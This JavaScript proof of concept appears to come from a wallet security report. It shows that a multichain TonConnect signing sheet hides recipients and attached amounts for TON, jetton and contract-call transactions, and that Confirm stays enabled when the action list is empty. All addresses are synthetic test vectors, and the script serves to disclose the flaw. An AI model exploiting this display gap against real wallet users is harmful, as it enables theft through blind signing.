// KPR-B-01 PoC: what is SIGNED vs what the multichain TonConnect sheet SHOWS.
// Signed side: built with real @ton/core, mirroring TonConnectEncoder +
// EncoderBase.internalMessage + JettonEncoder.encodeTransferBody exactly
// (op 0xf8a7ea5, queryId u64, coins, dest, response, custom?, forward, fwd?).
// Display side: ActionSimplePreview objects exactly as opentonapi generates
// them (event_converters.go templates) + the renderer's field selection
// (EmulatedActionsCard destructures only {name, description, value}).
//
// Addresses below are synthetic fixed test vectors (0:<hex>), not real accounts.
import { Address, beginCell, Cell, internal, loadMessageRelaxed, storeMessageRelaxed, toNano, comment } from "@ton/core";
import { createHash } from 'node:crypto';

const ATTACKER = Address.parse('0:' + '11'.repeat(32));
const JETTON_WALLET = Address.parse('0:' + '22'.repeat(32));
const USER = Address.parse('0:' + '33'.repeat(32));
const CONTRACT = Address.parse('0:' + '44'.repeat(32));

function bocOf(msg) {
    return beginCell().storeWritable(storeMessageRelaxed(msg)).endCell().toBoc().toString('base64');
}
function sha(s) { return createHash('sha256').update(s).digest('hex').slice(0, 16); }

// --- 1. Plain TON transfer: 5 TON to ATTACKER -------------------------------
const tonMsg = internal({ to: ATTACKER, value: toNano(5), bounce: false, body: comment('Payment') });
const tonBoc = bocOf(tonMsg);
const tonParsed = loadMessageRelaxed(Cell.fromBase64(tonBoc).beginParse());
console.log('== SIGNED (TON transfer) ==');
console.log('dest (raw)     :', tonParsed.info.dest.toRawString());
console.log('dest (friendly):', tonParsed.info.dest.toString());
console.log('coins (nano)   :', tonParsed.info.value.coins.toString());
console.log('boc sha256[:16]:', sha(tonBoc));

// TonAPI simplePreview for this action (opentonapi convertActionTonTransfer):
// Name "Gram Transfer", Description "Transferring {{.Value}}", Value "5 TON".
// `accounts` carries sender+recipient, but the sheet never renders it.
const tonPreview = { name: 'Gram Transfer', description: 'Transferring 5 TON', value: '5 TON',
    accounts: [{ address: USER.toRawString() }, { address: ATTACKER.toRawString() }] };
const renderedTon = `${tonPreview.name} | ${tonPreview.description} | ${tonPreview.value}`;
console.log('== DISPLAYED (EmulatedActionsCard: name/description/value only) ==');
console.log(renderedTon);
console.log('recipient raw in display     :', renderedTon.includes(ATTACKER.toRawString()));
console.log('recipient friendly in display:', renderedTon.includes(ATTACKER.toString()));

// --- 2. Jetton transfer: 25 USDT (6 dec) to ATTACKER, via jetton wallet ------
const jettonBody = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(12345n, 64)
    .storeCoins(25_000_000n)
    .storeAddress(ATTACKER)
    .storeAddress(USER)
    .storeMaybeRef(null)
    .storeCoins(1n)
    .storeMaybeRef(null)
    .endCell();
const jettonMsg = internal({ to: JETTON_WALLET, value: toNano(0.05), bounce: true, body: jettonBody });
const jettonBoc = bocOf(jettonMsg);
const jettonParsed = loadMessageRelaxed(Cell.fromBase64(jettonBoc).beginParse());
const bodySlice = jettonParsed.body.beginParse();
const op = bodySlice.loadUint(32); bodySlice.loadUint(64);
const innerAmount = bodySlice.loadCoins(); const innerDest = bodySlice.loadAddress();
console.log('\n== SIGNED (jetton transfer) ==');
console.log('outer dest (jetton wallet):', jettonParsed.info.dest.toRawString());
console.log('inner op                  :', '0x' + op.toString(16));
console.log('inner amount (base units) :', innerAmount.toString());
console.log('inner recipient (raw)     :', innerDest.toRawString());
console.log('inner recipient (friendly):', innerDest.toString());
console.log('boc sha256[:16]           :', sha(jettonBoc));
const jettonPreview = { name: 'Jetton Transfer', description: 'Transferring 25 USD₮', value: '25 USD₮',
    accounts: [{ address: USER.toRawString() }, { address: ATTACKER.toRawString() }] };
const renderedJetton = `${jettonPreview.name} | ${jettonPreview.description} | ${jettonPreview.value}`;
console.log('== DISPLAYED ==');
console.log(renderedJetton);
console.log('inner recipient raw in display     :', renderedJetton.includes(ATTACKER.toRawString()));
console.log('inner recipient friendly in display:', renderedJetton.includes(ATTACKER.toString()));
console.log('jetton wallet in display            :', renderedJetton.includes(JETTON_WALLET.toRawString()));

// --- 3. Smart-contract call attaching 50 TON ---------------------------------
const callMsg = internal({ to: CONTRACT, value: toNano(50), bounce: false,
    body: beginCell().storeUint(0xdeadbeef, 32).storeUint(7n, 64).endCell() });
const callParsed = loadMessageRelaxed(Cell.fromBase64(bocOf(callMsg)).beginParse());
console.log('\n== SIGNED (smart-contract exec) ==');
console.log('contract:', callParsed.info.dest.toRawString(), '| attached nano:', callParsed.info.value.coins.toString());
const scePreview = { name: 'Smart Contract Execution', description: 'Execution of smart contract', value: undefined,
    accounts: [{ address: CONTRACT.toRawString() }] };
const renderedSce = `${scePreview.name} | ${scePreview.description} | ${scePreview.value ?? '(no value shown)'}`;
console.log('== DISPLAYED ==');
console.log(renderedSce);
console.log('attached amount visible:', renderedSce.includes('50'));
console.log('contract visible       :', renderedSce.includes(CONTRACT.toRawString()));

// --- 4. Empty actions: card returns null, Confirm stays enabled -------------
// TonConnectTransactionSheet: `disabled={!estimate || send.isLoading}` — estimate
// exists whenever emulation succeeded, even with actions: []. EmulatedActionsCard:
// `if (previews.length === 0) return null;`
const previews = [];
console.log('\n== EMPTY ACTIONS ==');
console.log('previews.length:', previews.length, '-> EmulatedActionsCard renders:', previews.length === 0 ? 'null (no card)' : 'card');
console.log('Confirm enabled with estimate present: true (estimate exists, actions empty)');
